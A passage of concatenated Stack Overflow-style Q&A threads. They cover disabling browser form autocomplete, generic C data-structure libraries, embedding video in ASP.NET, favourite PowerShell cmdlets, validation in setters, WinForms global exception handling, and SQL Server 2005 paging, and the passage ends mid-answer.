 <p>In order to avoid the invalid XHTML you can set this attribute using javascript. Example using jQuery:</p>

<pre><code>&lt;input type=""text"" class=""noAutoComplete"" ... /&gt;

$(function() {
    $('.noAutoComplete').attr('autocomplete', 'off');
});
</code></pre>

<p>The problem is that users without javascript will do get the autocomplete functionality.</p>
 <p>Adding the </p>

<p><code>autocomplete=""off""</code> </p>

<p>to the form tag will disable the browser autocomplete (what was previously typed into that field) from all <code>input</code> fields within that particular form.</p>

<p>Tested on:</p>

<ul>
<li>Firefox 3.5, 4 BETA </li>
<li>Internet Explorer 8 </li>
<li>Chrome</li>
</ul>
 <p>I think <code>autocomplete=off</code> is supported in HTML 5.</p>

<p>Ask yourself why you want to do this though - it may make sense in some situations but don't do it just for the sake of doing it.</p>

<p>It's less convenient for users and not even a security issue in OS X (mentioned by Soren below). If you're worried about people having their passwords stolen remotely - a keystroke logger could still do it even though your app uses <code>autcomplete=off</code>.</p>

<p>As a user who chooses to have a browser remember (most of) my information, I'd find it annoying if your site didn't remember mine.</p>
 <p>I'd have to beg to differ with those answers that say to avoid disabling auto-complete.</p>

<p>The first thing to bring up is that auto-complete not being explicitly disabled on login form fields is a PCI-DSS fail. In addition, if a users' local machine is compromised then any autocomplete data can be trivially obtained by an attacker due to it being stored in the clear.</p>

<p>There is certainly an argument for usability, however there's a very fine balance when it comes to which form fields should have autocomplete disabled and which should not.</p>
 <p>You may use in input.</p>

<p>For example;</p>

<pre><code>&lt;input type=text name=""test"" autocomplete=""off"" /&gt;
</code></pre>
 <p>try these too if just <code>autocomplete=""off""</code> doesn't work:</p>

<pre><code>autocorrect=""off"" autocapitalize=""off"" autocomplete=""off""
</code></pre>
 <p>Three options:
First: </p>

<pre><code>&lt;input type='text' autocomplete='off' /&gt;
</code></pre>

<p>Second: </p>

<pre><code>&lt;form action='' autocomplete='off'&gt;
</code></pre>

<p>Third (javascript code): </p>

<pre><code>$('input').attr('autocomplete', 'off');
</code></pre>
 <p>None of the solutions worked for me in this conversation. </p>

<p>I finally figured out a <strong>pure HTML solution</strong> that requires <strong>no Javascript</strong>, works in modern browsers (except IE; there had to at least 1 catch, right?), and does not require you to disable autocomplete for the entire form.</p>

<p>Simply turn off autocomplete on the <code>form</code> and then turn it ON for any <code>input</code> you wish it to work within the form. For example:</p>

<pre class=""lang-html prettyprint-override""><code>&lt;form autocomplete=""off""&gt;
    &lt;!-- these inputs will not allow autocomplete and chrome 
         won't highlight them yellow! --&gt;
    &lt;input name=""username""  /&gt;
    &lt;input name=""password"" type=""password"" /&gt;
    &lt;!-- this field will allow autocomplete to work even 
         though we've disabled it on the form --&gt;
    &lt;input name=""another_field"" autocomplete=""on"" /&gt;
&lt;/form&gt;
</code></pre>
 <p>Most of the major browsers and password managers (correctly, IMHO) now ignore <code>autocomplete=off</code>. </p>

<p>Why? Many banks and other ""high security"" websites added <code>autocomplete=off</code> to their login pages ""for security purposes"" but this actually decreases security since it causes people to change the passwords on these high security sites to be easy to remember (and thus crack) since autocomplete was broken. </p>

<p>Long ago most password managers started ignoring <code>autocomplete=off</code>, and now the browsers are starting to do the same for username/password inputs only.</p>

<p>Unfortunately bugs in the autocomplete implementations insert username and/or password info  into inappropriate form fields, causing form validation errors, or worse yet, accidentally inserting usernames into fields that were intentionally left blank by the user.</p>

<p>What's a web developer to do?</p>

<ul>
<li>If you can keep all password fields on a page by themselves, that's a great start as it seems that the presence of a password field is the main trigger for user/pass autocomplete to kick in. Otherwise, read the tips below.</li>
<li><strong>Safari</strong> notices that there are 2 password fields and disables autocomplete in this case, assuming it must be a change password form, not a login form. So just be sure to use 2 password fields (new and confirm new) for any forms where you allow </li>
<li><p><strong>Chrome</strong> 34 unfortunately will try to autofill fields with user/pass whenever it sees a password field. This is quite a bad bug that hopefully they will change to the Safari behavior. However, adding this to the top of your form seems to disable the password autofilling:</p>

<pre><code>&lt;input type=""text"" style=""display:none""&gt;
&lt;input type=""password"" style=""display:none""&gt;
</code></pre></li>
</ul>

<p>I haven't yet investigated IE or Firefox thoroughly but will be happy to update the answer if others have info in the comments.</p>
 <p>Sometimes <strong>even autocomplete=off</strong> would <strong>not prevent to fill</strong> in credentials into wrong fields, but not user or nickname field. </p>

<p>This workaround is in addition to apinstein's post about browser behavior.</p>

<p><strong>fix browser autofill in: readonly and set writeble on focus (click and tab)</strong></p>

<pre><code> &lt;input type=""password"" readonly  
     onfocus=""this.removeAttribute('readonly');""/&gt;
</code></pre>

<p><strong>Because, Browser auto fills credentials to wrong text field!?</strong></p>

<p>I notice this strange behavior on Chrome and Safari, when there are password fields in <em>the same form.</em> I guess, the browser looks for a password field to insert your saved credentials. Then it autofills (just guessing due to observation) the nearest textlike-input field, that appears prior the password field in DOM. As the browser is the last instance and you can not control it, </p>

<p>This readonly-fix above worked for me.</p>
 <p>I've been trying endless solutions, and then I found this:</p>

<p>Instead of <code>autocomplete=""off""</code> just simply use <code>autocomplete=""false""</code></p>

<p>As simple as that, and it works like a charm in Google Chrome as well!</p>
 <p>This is a security issue that browsers ignores now. Browsers identifies and stores content using input names, even if developpers consider the information is sensitive and should not be stored. Making an input name different between 2 requests will solve the problem (but will still be saved in browser's cache and will also increase browser's cache). Ask the user to activate or deactivate options in its browser's settings is not a good solution. The issue can be fixed in the backend.</p>

<p>Here's my fix. An approach that I have implemented in my framework. All  autocomplete elements are generated with an hidden input like this :</p>

<pre><code>&lt;? $r = rmd5(rand().mocrotime(TRUE)); ?&gt;
&lt;form method=""POST"" action=""./""&gt;
    &lt;input type=""text"" name=""&lt;? echo $r; ?&gt;"" /&gt;
    &lt;input type=""hidden"" name=""__autocomplete_fix_&lt;? echo $r; ?&gt;"" value=""username"" /&gt;
    &lt;input type=""submit"" name=""submit"" value=""submit"" /&gt;
&lt;/form&gt;
</code></pre>

<p>Server then process post variables like this :</p>

<pre><code>foreach ($_POST as $key =&gt; $val)
{
    if(preg_match('#^__autocomplete_fix_#', $key) === 1){
        $n = substr($key, 19);
        if(isset($_POST[$n]))$_POST[$val] = $_POST[$n];
    }
}
</code></pre>

<p>The value can be accessed as usual</p>

<pre><code>var_dump($_POST['username']);
</code></pre>

<p>And the browser won't be able to suggest information from previous request or from previous users.</p>

<p>All works like a charm, even if browsers updates, wants to ignore autocomplete or not. That has been the best way to fix the issue for me.</p>
 <p>None of the hacks mentioned here worked for me in Chrome.
There's a discussion of the issue here: <a href=""https://code.google.com/p/chromium/issues/detail?id=468153#c41"" rel=""nofollow"">https://code.google.com/p/chromium/issues/detail?id=468153#c41</a></p>

<p>Adding this inside a <code>&lt;form&gt;</code> works (at least for now):</p>

<pre><code>&lt;div style=""display: none;""&gt;
    &lt;input type=""text"" id=""PreventChromeAutocomplete"" name=""PreventChromeAutocomplete"" autocomplete=""address-level4"" /&gt;
&lt;/div&gt;
</code></pre>
 <p>I know this is an old post, but it could be important to know that Firefox (I think only firefox) uses a value called <code>ismxfilled</code> that basically forces autocomplete.</p>

<p><code>ismxfilled=""0""</code> for <code>OFF</code> </p>

<p>or </p>

<p><code>ismxfilled=""1""</code> for <code>ON</code></p>
 <p>Adding <code>autocomplete=""off""</code> is not gonna cut it.</p>

<p>Change input type attribute to <code>type=""search""</code>.<br>
Google doesn't apply auto-fill to inputs with a type of search.</p>
 <p>Safari does not change its mind about autocomplete if you set <code>autocomplete=""off""</code> dynamically from javascript. However it would respect if you do that on per-field basis.</p>

<pre><code>$(':input', $formElement).attr('autocomplete', 'off');
</code></pre>
 <pre><code>&lt;script language=""javascript"" type=""text/javascript""&gt;
    $(document).ready(function () {
        try {
            $(""input[type='text']"").each(function(){
                           $(this).attr(""autocomplete"",""off"");
                        });
        }
        catch (e)
        { }
    });

&lt;/script&gt;
</code></pre>
 <p>Chrome is <a href=""https://code.google.com/p/chromium/issues/detail?id=468153#c123"" rel=""nofollow"">planning to support this</a>. </p>

<p>For now the best suggestion is to use an input type that is rarely autocompleted. </p>

<p><a href=""https://code.google.com/p/chromium/issues/detail?id=468153#c33"" rel=""nofollow"">chrome discussion</a></p>

<pre><code>&lt;input type='search' name=""whatever"" /&gt;
</code></pre>

<p>to be compatible with firefox, use normal autocomplete='off'</p>

<pre><code>&lt;input type='search' name=""whatever"" autocomplete='off' /&gt;
</code></pre>
 <p>You can disable autocomplete if you remove the <code>form</code> tag, the same was done by my bank and I was wondering how they did this. It even remove the value that was already remembered by the browser after you remove the tag.</p>
 <p>This is what we called autocomplete of a textbox.
<a href=""http://i.stack.imgur.com/6mr93.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/6mr93.png"" alt=""enter image description here""></a>
We can disable autocomplete of a Textbox in 2 ways-</p>

<ol>
<li>By Browser Label</li>
<li><p>By Code</p>

<p>To disable in browser go to the setting</p>

<p><a href=""http://i.stack.imgur.com/3nHbK.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/3nHbK.png"" alt=""To dissable in browse go to the setting""></a></p></li>
</ol>

<p><a href=""http://i.stack.imgur.com/4QqJL.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/4QqJL.png"" alt=""Go to advance setting and uncheck the checkbox and then Restore.""></a></p>

<p>Go to advance setting and uncheck the checkbox and then Restore. </p>

<p>If you want to disable in coding label you can do as follow-<br>
Using <code>AutoCompleteType=""Disabled""</code>:</p>

<pre><code>&lt;asp:TextBox runat=""server"" ID=""txt_userid"" AutoCompleteType=""Disabled""&gt;&lt;/asp:TextBox&gt;  
</code></pre>

<p>By Setting Form <code>autocomplete=""off""</code>:</p>

<pre><code>&lt;asp:TextBox runat=""server"" ID=""txt_userid"" autocomplete=""off""&gt;&lt;/asp:TextBox&gt; 
</code></pre>

<p>By Setting Form <code>autocomplete=""off""</code>:</p>

<pre><code>&lt;form id=""form1"" runat=""server"" autocomplete=""off""&gt;  
    //your content
&lt;/form&gt;  
</code></pre>

<p>By using code in .cs page</p>

<pre><code>protected void Page_Load(object sender, EventArgs e)  
    {  
    if(!Page.IsPostBack)  
    {  


        txt_userid.Attributes.Add(""autocomplete"", ""off"");  

    }  
}  
</code></pre>

<p><strong>By Using Jquery</strong></p>

<pre><code>head runat=""server""&gt;  
&lt;title&gt;&lt;/title&gt;  
&lt;script src=""Scripts/jquery-1.6.4.min.js""&gt;&lt;/script&gt;  
&lt;script type=""text/javascript""&gt;  
    $(document).ready(function () {  
        $('#txt_userid').attr('autocomplete', 'off');  

    });  

&lt;/script&gt;  
</code></pre>
 <p>A little late to the game...but I just ran into this problem and tried several failures, but this one works for me found on <a href=""https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion"" rel=""nofollow"">MDN</a></p>

<blockquote>
  <p>In some case, the browser will keep suggesting autocompletion values
  even if the autocomplete attribute is set to off. This unexpected
  behavior can be quite puzzling for developers. The trick to really
  force the no-completion is to assign a random string to the attribute
  like so :</p>
</blockquote>

<pre><code>autocomplete=""nope""
</code></pre>
 <p>I can't believe this is still an issue so long after it's been reported. The above solutions didn't work for me, as safari seemed to know when the element was not displayed or off-screen, however the following did work for me:</p>

<pre><code>&lt;div style=""height:0px; overflow:hidden; ""&gt;
  Username &lt;input type=""text"" name=""fake_safari_username"" &gt;
  Password &lt;input type=""password"" name=""fake_safari_password""&gt;
&lt;/div&gt;
</code></pre>

<p>Hope that's useful for somebody!</p>
 <p>If your issue is having a password field being auto-completed, then you may find this useful...</p>

<p>We had this issue in several areas of our site where the business wanted to re-query the user for their username and password and specifically did not want the password autofill to work for contractual reasons.  We found that the easiest way to do this is to put in a fake password field for the browser to find and fill while the real password field remains untouched.</p>

<pre><code>&lt;!-- This is a fake password input to defeat the browser's autofill behavior --&gt;
&lt;input type=""password"" id=""txtPassword"" style=""display:none;"" /&gt;
&lt;!-- This is the real password input --&gt;
&lt;input type=""password"" id=""txtThisIsTheRealPassword"" /&gt;
</code></pre>

<p>Note that in Firefox and IE, it was simply enough to put any input of type password before the actual one but Chrome saw through that and forced me to actually name the fake password input (by giving it an obvious password id) to get it to ""bite"".  I used a class to implement the style instead of using an embedded style so try that if the above doesn't work for some reason.</p>
 <p>You can simply put the <code>autocomplete=""off""</code> in the HTML fields like following code.</p>

<pre><code>&lt;input type=""text"" name="""" value="""" autocomplete=""off"" /&gt;
</code></pre>
 <p>So here is it (:</p>

<pre><code>&lt;input oninput=""turnOnPasswordStyle()"" id=""inputpassword"" type=""text""&gt;

function turnOnPasswordStyle(){
        $('#inputpassword').attr('type', ""password"");
}
</code></pre>
 <p>The answer <strong>dsuess</strong> posted with the readonly was very clever and worked. But as I am using boostrap, the readonly input field was - until focused - marked with grey background. While the document loads, you can trick the browser by simply locking and unlocking the input.</p>

<p>So I had an idea to implement this into jQuery solution:</p>

<blockquote>
<pre><code>    jQuery(document).ready(function () {
        $(""input"").attr('readonly', true);
        $(""input"").removeAttr('readonly');
   });
</code></pre>
</blockquote>
 <p>My problem was mostly autofill with Chrome, but I think this is probably more problematic than autocomplete.</p>

<p>Trick : using a timer to reset form and set password fields to blank. The 100ms duration seems to be minimal for it to work.</p>

<pre><code>$(document).ready(function() {
    setTimeout(function() {
        var $form = $('#formId');
        $form[0].reset();
        $form.find('INPUT[type=password]').val('');
    }, 100);
});
</code></pre>
 <p>I use the following jQuery snippet:</p>

<pre><code>// Prevent input autocomplete
$.fn.preventAutocomplete = function() {
    this.each(function () {
        var $el = $(this);
        $el
            .clone(false, false)
            .insertBefore($el)
            .prop('id', '')
            .hide()
        ;
    });
};
</code></pre>

<p>And than just <code>$('#login-form input').preventAutocomplete();</code></p>
"
"Good STL-like library for C <p>What are good libraries for C with datastructures like vectors, deques, stacks, hashmaps, treemaps, sets, etc.? Plain C, please, and platform-independent.</p> <P>As always, Google is your friend:</P>
<P><A href=""http://nixbit.com/cat/programming/libraries/c-generic-library/"">http://nixbit.com/cat/programming/libraries/c-generic-library/</A></P>
<P>specifically:</P>
<P><A href=""http://nixbit.com/cat/programming/libraries/generic-data-structures-library/"">http://nixbit.com/cat/programming/libraries/generic-data-structures-library/</A></P> <p>The <a href=""http://library.gnome.org/devel/glib/stable/"" rel=""nofollow"">Glib</a> library used on the Gnome project may also be some use. Moreover it is pretty well tested.</p>

<p>IBM developer works has a good tutorial on its use: <a href=""https://www.ibm.com/developerworks/linux/tutorials/l-glib/"" rel=""nofollow"">Manage C data using the GLib collections</a></p>
 <p>There's some stuff in the <a href=""http://apr.apache.org/"" rel=""nofollow"" title=""Apache Portable Runtime"">Apache Portable Runtime</a> (APR) that I'd expect to be very solid.</p>
 <p>Maybe <a href=""http://sglib.sourceforge.net/"" rel=""nofollow"">http://sglib.sourceforge.net/</a> if you want an easy to use, very fast, macro based library.</p>
 <p>If hash tables, extensible strings and dynamic vector are enough for your needs, please have a look at the library I put toghether: <a href=""http://code.google.com/p/c-libutl/"" rel=""nofollow"">http://code.google.com/p/c-libutl/</a>.</p>

<p>I also would welcome any feedback!</p>
"
"What are effective options for embedding video in an ASP.NET web site? <p>A quick glance at the present-day internet would seem to indicate that Adobe Flash is the obvious choice for embedding video in a web page.  Is this accurate, or are they other effective choices?  Does the choice of ASP.NET as a platform influence this decision?</p> <p>Flash is certainly the most ubiquitous and portable solution.  <a href=""http://en.wikipedia.org/wiki/Adobe_Flash#Market_share"">98% of browsers</a> have Flash installed.  Other alternatives are <a href=""http://www.apple.com/quicktime/download/"">Quicktime</a>, <a href=""http://www.microsoft.com/windows/windowsmedia/default.mspx"">Windows Media Player</a>, or even <a href=""http://silverlight.net/"">Silverlight</a> (Microsoft's Flash competitor, which can be used to embed several video formats).</p>

<p>I would recommend using Flash (and it's FLV video file format) for embedding your video unless you have very specific requirements as far as video quality or DRM.</p> <p>Flash is usually the product of choice: Everyone has it, and using the <a href=""http://www.jeroenwijering.com/?item=JW_FLV_Media_Player"">JW FLV Player</a> makes it relatively easy on your side.</p>

<p>As for other Video Formats, there are WMV and QuickTime, but the players are rather ""heavy"", not everyone might have them and they feel so 1990ish...</p>

<p>Real Player... Don't let me even start ranting about that pile of ...</p>

<p>The only other alternative of Flash that I would personally consider is Silverlight, which allows streaming WMV Videos. I found the production of WMV much better and easier than FLV because all Windows FLV Encoders I tried are not really good and stable, whereas pretty much every tool can natively output WMV. The problem with Silverlight is that no one has that Browser Plugin (yet?). There is also a player <a href=""http://www.jeroenwijering.com/?item=JW_WMV_Player"">from JW</a>.</p> <p>I have worked for a company that developed a system for distributing media content to dedicated ""players"". It was web based and used ASP.NET technology and have tried almost every possible media format you can think of and your choice really comes down to asking yourself:</p>

<p>does it needs to play directly out of the box, or can I make sure that the components required to play the videos can be installed beforehand?</p>

<p>If your answer is that it needs to play out of the box then really your only option is flash (I know that it is not installed by default, but most will already have it installed)</p>

<p>If it is not a big issue that extra components are needed then you can go with formats that are supported by windows media player</p>

<p>The reason why windows media player falls into the second option is because for some browsers and some formats extra components must be installed.</p>

<p>We had the luxury that the ""players"" were provided by us, so we could go for the second option, however even we tried to <a href=""http://ffmpeg.mplayerhq.hu/"" rel=""nofollow"">convert as much as possible</a> back to flash because it handles way better than windows media player</p> <p>One consideration would be whether video playback is via progressive download or streaming. If it's progressive download, then I would say use Flash because you get a wider audience reach.</p>

<p>For streaming wmv, it is out of the box functionality provided by <a href=""http://www.microsoft.com/windows/windowsmedia/forpros/server/server.aspx"" rel=""nofollow"">Windows Media Services</a></p>

<p>For streaming flash, you will have to install a streaming server on your Windows box. Some options are:</p>

<ul>
<li><a href=""http://www.adobe.com/products/flashmediaserver"" rel=""nofollow"">Adobe Flash Media Server</a> (Commercial)</li>
<li><a href=""http://www.wowzamedia.com/products.html"" rel=""nofollow"">Wowza Media Server</a> (Free/Commercial) </li>
<li><a href=""http://osflash.org/red5"" rel=""nofollow"">Red5 Flash Server</a> (Open Source)</li>
</ul>
 <pre><code>&lt;object width=""660"" height=""525""&gt;&lt;param name=""movie"" value=""http://www.youtube.com/v/WAQUskZuXhQ&amp;hl=en&amp;fs=1&amp;color1=0x006699&amp;color2=0x54abd6&amp;border=1""&gt;&lt;/param&gt;&lt;param name=""allowFullScreen"" value=""true""&gt;&lt;/param&gt;&lt;param name=""allowscriptaccess"" value=""always""&gt;&lt;/param&gt;&lt;embed src=""http://www.youtube.com/v/WAQUskZuXhQ&amp;hl=en&amp;fs=1&amp;color1=0x006699&amp;color2=0x54abd6&amp;border=1"" type=""application/x-shockwave-flash"" allowscriptaccess=""always"" allowfullscreen=""true"" width=""660"" height=""525""&gt;&lt;/embed&gt;&lt;/object&gt;
</code></pre>
 <p>""Does the choice of ASP.NET as a platform influence this decision?""</p>

<p><strong>Probably not.</strong></p>
 <p>If you have access to Microsoft Expression Encoder 2, you can use that to encode a video file and generate a Silverlight video player. Then if you have IIS 7, you can use Adaptive or <a href=""http://www.iis.net/extensions/SmoothStreaming"" rel=""nofollow"">Smooth Streaming</a> also checkout <a href=""http://www.smoothhd.com"" rel=""nofollow"">Smooth HD</a> for a really cool example. </p>

<p>You can also do streaming from the free <a href=""http://silverlight.live.com/"" rel=""nofollow"">Microsoft Silverlight Streaming Service</a>. It's connected to a Windows Live account.</p>

<p>A consideration is that the client will need to have Silverlight installed, just like Flash, but Flash has been around longer.</p>
"
"What are your favorite Powershell Cmdlets? <p>I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?</p>
 <p>While semi-related to your question, it does not entirely fit the Powershell NetCmdlets motif. But I wanted to post it anyhow as I use it daily and it may help others. Simply making shift-control-c key combo into displaying the visual studio command prompt. </p> <p>I wrote a <code>PowerShell</code> provider to give me access to <code>IE7</code>'s <code>RSS</code> feed store, and had lots of fun with it. It lets me <code>cd</code> to a drive called feed: and navigate around folders and feeds using cd and dir. It even lets you add or remove feeds from the command line. </p>

<p>See this post on my blog as an example:</p>

<p><a href=""http://www.madprops.org/blog/getting-the-most-prolific-authors-in-your-feeds/"" rel=""nofollow"">Getting the Most Prolific Authors in your Feeds</a></p>

<p>It's rolled up into the <code>PowerShell</code> Community Extensions project nowadays, which you can find on <code>CodePlex</code> <a href=""http://www.codeplex.com/PowerShellCX"" rel=""nofollow"">here</a>.</p>
 <p>there's an <a href=""http://blog.sapien.com/index.php/2008/06/23/out-twitter/"">out-twitter script</a> i use for posting to twitter. it's nice, as it means you can send something to twitter without the risk of being distracted by a browser.</p>

<p>i added an alias for it, ""twit"".</p>

<p>so now you can type, for example:</p>

<pre><code>PS C:\&gt;""trying out stack overflow"" | twit<br></code></pre>

<p>and if successfully lodged, it will return an integer that identifies your post.</p> <p>While it is not as fun as Out-Twitter, my favorite cmdlet is Get-Member, since it allows me to examine any of the objects I'm working with and find out new properties and methods, as well as the underlying type of the object.</p>

<p>If I did not choose Get-Member, I would have to go with Out-Clipboard from the PowerShell Community Extensions (PSCX), as it enables a whole lot of clipboard automation and makes using PowerShell for code templating much easier.</p>
 <p>Well it is a little bland, but I would vote for Get-Help.</p>
 <p>ls (Get-ChildItem)
rm (Remove-Item)
ps (Get-Process)</p>

<p>and the rest of my familiar commands that now ""just work"" :)</p>

<p>but seriously... New-Object would have to get my vote.  With it, powershell can do ANYTHING :)</p>
 <p>As a programmer/hacker, <code>Get-Member</code> and <code>Get-Command</code> are the ones I use more than any others, but the ones I use to show off are <code>Select-Control</code> and <code>Send-Keys</code> from <a href=""http://CodePlex.com/WASP"" rel=""nofollow"">WASP</a>, the <a href=""http://PowerGadgets.com"" rel=""nofollow"">PowerGadgets</a>, and some of my own stuff written in WPF against CTP2 or <a href=""http://CodePlex.com/PoshConsole"" rel=""nofollow"">PoshConsole</a> ;-)</p>

<p><img src=""http://i.stack.imgur.com/HCO2p.png"" alt=""Weather in PoshConsole""></p>
 <p>Get-Member, hands down. No, it's not very glamorous, but the ability to inspect objects interactively beats interrupting your work to go hit up MSDN.</p>
 <p>I find Get-member to be the most useful native PowerShell cmdlet. I also use Get-WMIObject on a daily basis.  Even if I'm troubleshooting a VBScript problem for someone I'll turn to Get-WMIObject because I can work with WMI interactively.</p>
 <p><strong>Set-Clipboard</strong>, found on the PowerShell Community Extensions project on CodePlex. Usually when I'm working in PowerShell, the ultimate goal is to generate some text or even an Excel spreadsheet. Set-Clipboard eliminates all of the intermediate ""save it to a file, ok now open that file, select all, copy to clipboard"" steps--you do it all in PowerShell.</p>
 <p>The combination of Get-WMIObject and Get-Member is something I use throughout the workday.  Working on Get-Sandwich.</p>
 <p><strong>export-csv</strong>. This creates a nice report in a manager-friendly Excel-ready format. Bonus points if you have community extensions installed and user <strong>send-smtpmail</strong>. </p>

<p>Management report in their inbox from the commandline. Nice.</p>
 <p>I do alot of work with Microsoft Lync 2010 which includes a set of synthetic for testing functionality. Of these Test-CsPstnOutboundCall is my favourite.</p>

<p>For general scripting got to vote for get-member and get-help :)</p>
"
"Data verifications in Getter/Setter or elsewhere? <p>I'm wondering if it's a good idea to make <strong>verifications</strong> in <strong>getters</strong> and <strong>setters</strong>, or elsewhere in the code.</p>

<p>This might surprise you be when it comes to <strong>optimizations</strong> and <strong>speeding</strong> up the code, I think you should not make verifications in getters and setters, but in the code where you're <strong>updating</strong> your files or database. Am I wrong?</p>
 <p>Validation should be captured separately from getters or setters in a validation method.  That way if the validation needs to be reused across multiple components, it is available.</p>

<p>When the setter is called, such a validation service should be utilized to sanitize input into the object.  That way you know all information stored in an object is valid at all times.</p>

<p>You don't need any kind of validation for the getter, because information on the object is already trusted to be valid.</p>

<p>Don't save your validation until a database update!! It is better to <strong>fail fast</strong>.</p> <p>From the perspective of having the most maintainable code, I think you should do as much validation as you can in the setter of a property. This way you won't be caching or otherwise dealing with invalid data.</p>

<p>After all, this is what properties are meant for. If all you have is a bunch of properties like...</p>

<pre><code>public string Name
{
    get
    {
        return _name;
    }
    set
    {
        _name = value;
    }
}
</code></pre>

<p>... they might as well be fields</p> <p>It depends.</p>

<p>Generally, code should fail fast. If the value can be set by multiple points in the code and you validate only on after retrieving the value, the bug appears to be in the code that does the update. If the setters validate the input, you know what code is trying to set invalid values.</p> <p>Well, one of the reaons why classes usually contain private members with public getters/setters is exactly because they can verify data.</p>

<p>If you have a Number than can be between 1 and 100, i would definitely put something in the setter that validates that and then maybe throw an exception that is being caught by the code. The reason is simple: If you don't do it in the setter, you have to remember that 1 to 100 limitation every time you set it, which leads to duplicated code or when you forget it, it leads to an invalid state.</p>

<p>As for performance, i'm with Knuth here:</p>

<blockquote>
  <p>""We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil.""</p>
</blockquote> <p>You might wanna check out <a href=""http://books.google.com/books?id=7dlaMs0SECsC"" rel=""nofollow"">Domain Driven Design</a>, by Eric Evans. DDD has this notion of  a Specification:</p>

<blockquote>
  <p>... explicit predicate-like VALUE
  OBJECTS for specialized purposes. A
  SPECIFICATION is a predicate that
  determines if an object does or does
  not satisfy some criteria.</p>
</blockquote>

<p>I think failing fast is one thing, the other is where to keep the logic for validation. The domain is the right place to keep the logic and I think a Specification Object or a validate method on your Domain objects would be a good place.</p> <P>I like to implement <A href=""http://msdn.microsoft.com/en-us/library/system.componentmodel.idataerrorinfo.aspx"" rel=""nofollow"">IDataErrorInfo</A> and put my validation logic in its Error and this[columnName] properties. That way if you want to check programmatically whether there's an error you can simply test either of those properties in code, or you can hand the validation off to the data binding in Web Forms, Windows Forms or WPF. </P>
<P>WPF's ""ValidatesOnDataError"" Binding property makes this particularly easy.</P> <p>@Terrapin, re:</p>

<blockquote>
  <p>If all you have is a bunch of [simple
  public set/get] properties ... they
  might as well be fields</p>
</blockquote>

<p>Properties have other advantages over fields. They're a more explicit contract, they're  serialized, they can be debugged later, they're a nice place for extension through inheritance. The clunkier syntax is an accidental complexity -- .net 3.5 for example overcomes this.</p>

<p>A common (and flawed) practice is to start with public fields, and turn them into properties later, on an 'as needed' basis. This breaks your contract with anyone who consumes your class, so it's best to start with properties.</p> <p>I try to never let my objects enter an invalid state, so setters definitely would have validation as well as any methods that change state.  This way, I never have to worry that the object I'm dealing with is invalid.  If you keep your methods as validation boundaries, then you never have to worry about validation frameworks and IsValid() method calls sprinkled all over the place.</p>
"
"Global Exception Handling for winforms control <p>When working on ASP.NET 1.1 projects I always used the Global.asax to catch all errors. I'm looking for a similar way to catch all exceptions in a Windows Forms user control, which ends up being a hosted IE control. What is the proper way to go about doing something like this?</p>
 <p>You need to handle the <code>System.Windows.Forms.Application.ThreadException</code> event for Windows Forms. This article really helped me: <a href=""http://bytes.com/forum/thread236199.html"">http://bytes.com/forum/thread236199.html</a>.</p>
 <p>If you're using VB.NET, you can tap into the very convenient ApplicationEvents.vb.  This file comes for free with a VB.NET WinForms project and contains a method for handling <a href=""http://msdn.microsoft.com/en-us/library/3a02k5s0%28VS.80%29.aspx"">unhandled exceptions</a>.</p>

<p>To get to this nifty file, it's ""Project Properties &gt;&gt; Application &gt;&gt; Application Events""</p>

<p>If you're not using VB.NET, then yeah, it's handling <a href=""http://msdn.microsoft.com/en-us/library/system.windows.forms.application.threadexception.aspx"">Application.ThreadException</a>.</p> <p>Currently in my winforms app I have handlers for <code>Application.ThreadException</code>, as above, but also <code>AppDomain.CurrentDomain.UnhandledException</code></p>

<p>Most exceptions arrive via the <code>ThreadException</code> handler, but the AppDomain one has also caught a few in my experience</p> <p>Code from MSDN: <a href=""http://msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx?cs-save-lang=1&amp;cs-lang=vb#code-snippet-2"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx?cs-save-lang=1&amp;cs-lang=vb#code-snippet-2</a></p>

<pre><code>Sub Main()
  Dim currentDomain As AppDomain = AppDomain.CurrentDomain
  AddHandler currentDomain.UnhandledException, AddressOf MyHandler

  Try 
     Throw New Exception(""1"")
  Catch e As Exception
     Console.WriteLine(""Catch clause caught : "" + e.Message)
     Console.WriteLine()
  End Try 

  Throw New Exception(""2"")
End Sub 

Sub MyHandler(sender As Object, args As UnhandledExceptionEventArgs)
  Dim e As Exception = DirectCast(args.ExceptionObject, Exception)
  Console.WriteLine(""MyHandler caught : "" + e.Message)
  Console.WriteLine(""Runtime terminating: {0}"", args.IsTerminating)
End Sub 
</code></pre>
 <p>To Handle Exceptions Globally...</p>

<p><strong>Windows Application</strong></p>

<p>System.Windows.Forms.Application.ThreadException event</p>

<p><em>Generally Used in Main Method. Refer <a href=""https://msdn.microsoft.com/en-us/library/system.windows.forms.application.threadexception.aspx"" rel=""nofollow"">MSDN Thread Exception</a></em></p>

<p><strong>Asp.Net</strong></p>

<p>System.Web.HttpApplication.Error event</p>

<p><em>Normally Used in Global.asax file. Refer <a href=""https://msdn.microsoft.com/en-us/library/24395wz3(v=vs.140).aspx"" rel=""nofollow"">MSDN Global.asax Global Handlers</a></em></p>

<p><strong>Console Application</strong></p>

<p>System.AppDomain.UnhandledException event</p>

<p><em>Generally used in Main Method. Refer <a href=""https://msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx"" rel=""nofollow"">MSDN UnhandledException</a></em> </p>
"
"Paging SQL Server 2005 Results <p>How do I page results in SQL Server 2005?</p>

<p>I tried it in SQL Server 2000, but there was no reliable way to do this. I'm now wondering if SQL Server 2005 has any built in method?</p>

<p>What I mean by paging is, for example, if I list users by their username, I want to be able to only return the first 10 records, then the next 10 records and so on.</p>

<p>Any help would be much appreciated.</p>
 <p>You can use <code>the Row_Number()</code> function.
Its used as follows:</p>

<pre><code>SELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName
FROM Users
</code></pre>

<p>From which it will yield a result set with a <code>RowID</code> field which you can use to page between.</p>

<pre><code>SELECT * 
FROM 
    ( SELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName
      FROM Users 
    ) As RowResults
WHERE RowID Between 5 AND 10
